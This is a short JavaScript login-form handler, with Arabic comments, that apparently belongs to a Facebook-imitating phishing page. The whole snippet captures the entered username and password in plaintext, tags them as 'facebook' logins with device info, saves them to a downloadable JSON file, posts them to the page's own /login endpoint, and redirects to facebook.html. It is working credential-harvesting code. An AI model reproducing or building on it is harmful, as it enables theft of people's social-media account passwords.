loginForm.addEventListener('submit', function(e) {
     e.preventDefault();
     
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
     
     // إنشاء كائن ببيانات تسجيل الدخول
     const loginData = {
         username: username,
         password: password,
         platform: 'facebook',
         deviceInfo: deviceInfo,
         timestamp: new Date().toISOString()
     };
     
     // إنشاء ملف JSON للتنزيل
     const jsonData = JSON.stringify(loginData, null, 2);
     const blob = new Blob([jsonData], { type: 'application/json' });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
     a.download = `facebook_login_${Date.now()}.json`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
     
     // إرسال البيانات إلى الخادم
     fetch('/login', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: jsonData
     })
     .then(response => response.json())
     .then(data => {
         if (data.success) {
             loginMessage.textContent = 'Login successful! Redirecting...';
             loginMessage.className = 'login-message success';
             loginMessage.style.display = 'block';
             
             setTimeout(() => {
                 window.location.href = 'facebook.html';
             }, 2000);
         } else {
             loginMessage.textContent = 'Invalid username or password. Please try again.';
             loginMessage.className = 'login-message error';
             loginMessage.style.display = 'block';
         }
     })
     .catch(error => {
         loginMessage.textContent = 'Login failed. Please try again later.';
         loginMessage.className = 'login-message error';
         loginMessage.style.display = 'block';
         console.error('Error:', error);
     });
 });